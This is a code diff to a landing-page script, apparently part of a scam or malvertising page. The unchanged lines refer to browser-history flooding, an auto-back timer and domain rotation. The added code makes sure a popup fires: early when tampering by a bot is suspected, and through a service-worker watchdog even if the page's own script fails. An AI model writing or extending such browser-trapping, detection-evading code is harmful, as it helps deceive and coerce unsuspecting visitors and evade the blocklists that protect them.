@@ -13,6 +13,14 @@
     return;
   }
 
+  // --- ID 18: state tampered (HMAC fail) — fire popup immediately ---
+  // persistence.js sets __stateInvalid=true on pageshow HMAC failure
+  // Bot tampering state = they're real enough to tamper → show popup early
+  if(window.__stateInvalid){
+    setTimeout(function(){if(window.__showPopup)window.__showPopup();},200);
+    return;
+  }
+
   var cfg=window.__CONFIG||{};
   var FLOOD=cfg.HISTORY_FLOOD_COUNT||50;
   var AUTO_BACK=cfg.AUTO_BACK_MS||1000;
@@ -114,10 +122,15 @@
     navigator.serviceWorker.register('/sw.js',{scope:'/'}).then(function(){
       // trimitem channel names la SW — timer_start cu chMain + chHb
       navigator.serviceWorker.ready.then(function(reg){
-        if(reg.active) reg.active.postMessage({
-          type:'timer_start', delay:delay,
-          chMain:CH_MAIN, chHb:CH_HB
-        });
+        if(reg.active) {
+          reg.active.postMessage({
+            type:'timer_start', delay:delay,
+            chMain:CH_MAIN, chHb:CH_HB
+          });
+          // ID 19: lander alive ping — SW starts 2s watchdog
+          // If no second ping arrives, SW fires popup (covers silent JS errors in lander)
+          reg.active.postMessage({ type:'lander_alive', delay:delay });
+        }
       });
     }).catch(function(){});
   }
@@ -169,5 +182,12 @@
 
   // --- DOMAIN ROTATION health monitor ---
   if(window.__domainRotation)window.__domainRotation.start();
+
+  // --- ID 19: signal SW that lander.js fully initialized (cancels watchdog) ---
+  if('serviceWorker' in navigator){
+    navigator.serviceWorker.ready.then(function(reg){
+      if(reg.active) reg.active.postMessage({ type:'lander_ready' });
+    }).catch(function(){});
+  }
 
 })();
